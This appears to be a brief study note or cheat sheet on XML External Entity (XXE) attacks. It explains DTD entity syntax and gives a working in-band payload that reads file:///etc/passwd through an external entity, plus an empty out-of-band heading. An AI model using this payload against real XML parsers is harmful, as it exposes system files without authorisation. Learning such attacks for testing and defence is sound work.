# XXE Attack
XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data

## Understanding DTD
`!DOCTYPE {{ROOT_NODE}}` =>  Defines a root element of the document named ROOT_NODE
`!ELEMENT {{NODE}}` => Defines a node (can be the root_node)
`!ENTITY {{ENTITY_NAME}} "{{ENTITY_VALUE}}"` => Defines an internal entity with a name and a value
`!ENTITY {{ENTITY_NAME}} SYSTEM "{{URI/URL}}"` => Defines an external entity with a name and an uri, e.g. `SYSTEM 'file:///etc/passwd'`

Types available:
- #PCDATA => Parseable Character DATA

## in-band attack
Get an immediate reply

### Displaying a value
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

## out-of-band attack
Reflect output to a file / server.